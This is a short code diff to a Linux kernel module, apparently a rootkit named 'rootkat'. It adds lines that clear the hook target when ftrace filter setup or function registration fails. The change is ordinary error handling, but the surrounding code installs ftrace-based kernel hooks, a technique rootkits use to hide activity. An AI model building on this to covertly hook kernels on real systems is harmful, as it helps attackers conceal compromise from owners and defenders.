@@ -38,6 +38,7 @@ int rootkat_hook_install(struct rootkat_hook *h)
 	rc = ftrace_set_filter_ip(&h->ops, h->target, 0, 0);
 	if (rc) {
 		pr_err(TAG "ftrace_set_filter_ip: %d\n", rc);
+		h->target = 0;   /* keep rootkat_hook_remove() idempotent */
 		return rc;
 	}
 
@@ -45,6 +46,7 @@ int rootkat_hook_install(struct rootkat_hook *h)
 	if (rc) {
 		pr_err(TAG "register_ftrace_function: %d\n", rc);
 		ftrace_set_filter_ip(&h->ops, h->target, 1, 0);
+		h->target = 0;
 		return rc;
 	}
 
